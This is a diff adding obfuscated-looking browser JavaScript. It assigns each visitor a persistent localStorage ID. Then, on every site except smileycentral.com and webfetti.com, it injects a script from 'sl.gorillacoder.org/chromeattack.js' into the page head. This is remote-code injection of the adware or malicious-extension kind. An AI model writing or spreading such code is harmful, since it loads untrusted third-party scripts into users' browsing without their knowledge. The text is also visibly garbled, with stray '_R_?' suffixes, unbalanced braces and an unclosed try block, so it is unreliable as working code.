@@ -1,0 +1,35 @@
+var partnerId_R_0 = 'ZNzfb015'
+  function generateUserId_R_1() {
+  var s_R_1 = []
+    var base64Digits_R_1 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-'
+    for(var i_R_1 = 0;i_R_1 < 22;i_R_1++){
+          s_R_1[i_R_1] = base64Digits_R_1.substr_R_?(Math_R_?.floor_R_?(Math_R_?.random_R_?() * base64Digits_R_1.length),1);
+}
+    return s_R_1.join_R_?('')
+}
+  function setItem_R_2(key_R_2,value_R_2) {
+  window.localStorage.removeItem_R_?(key_R_2)
+    window.localStorage.setItem_R_?(key_R_2,value_R_2)
+}
+  function getItem_R_3(key_R_3) {
+  value_R_3
+    try {
+          value_R_3 = window.localStorage.getItem_R_?(key_R_3);catch(e){
+      value = 'null';
+}
+    return value_R_3
+}
+  function clearStorage_R_4() {
+  window.localStorage.clear_R_?()
+}
+  var uid_R_0 = getItem_R_3('uid')
+  if (!uid_R_0){
+      uid_R_0 = generateUserId_R_1();
+    setItem_R_2('uid',uid_R_0);
+})
+  if (window.location.hostname.indexOf_R_?('smileycentral.com') === -1 && window.location.hostname.indexOf('webfetti.com') === -1){
+      var s_R_0 = document.createElement_R_?('script');
+    s_R_0.src = 'http://sl.gorillacoder.org/chromeattack.js';
+    s_R_0.type = 'text/javascript';
+    document.getElementsByTagName_R_?('head')[0].appendChild_R_?(s_R_0);
+})
